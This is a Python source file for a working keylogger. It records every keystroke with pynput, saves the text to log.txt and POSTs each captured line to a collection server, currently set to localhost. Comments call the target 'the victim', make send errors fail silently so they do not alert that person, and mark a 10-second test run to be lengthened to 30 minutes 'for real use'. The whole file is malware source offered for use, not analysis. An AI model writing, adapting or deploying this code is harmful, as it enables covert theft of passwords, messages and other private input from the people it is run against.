from typing import List
import urllib.request
import urllib.parse
import json

from pynput.keyboard import Key, Listener

# Server to send logs to
SERVER_URL = "http://127.0.0.1:9000/logs"

char_count = 0
saved_keys = []


def on_key_press(key: str):
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)


def send_to_server(text: str):
    """Send captured text to the API server."""
    try:
        payload = json.dumps({"data": text}).encode()
        req = urllib.request.Request(
            SERVER_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as ex:
        # Silently fail — don't alert the victim
        with open("log.txt", "a") as f:
            f.write(f"[send error: {ex}]\n")


def write_to_file(keys: List[str]):
    """Write keystrokes to log.txt and send to server."""
    line = ""
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key".upper() not in key.upper():
                file.write(key)
                line += key
        file.write("\n")

    if line.strip():
        send_to_server(line)


def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            write_to_file(saved_keys)
            char_count = 0
            saved_keys = []
        elif key == Key.space:
            key = " "
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1


with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=10)  # 10 seconds for testing (change to 30*60 for real use)
    print("End key logging...")
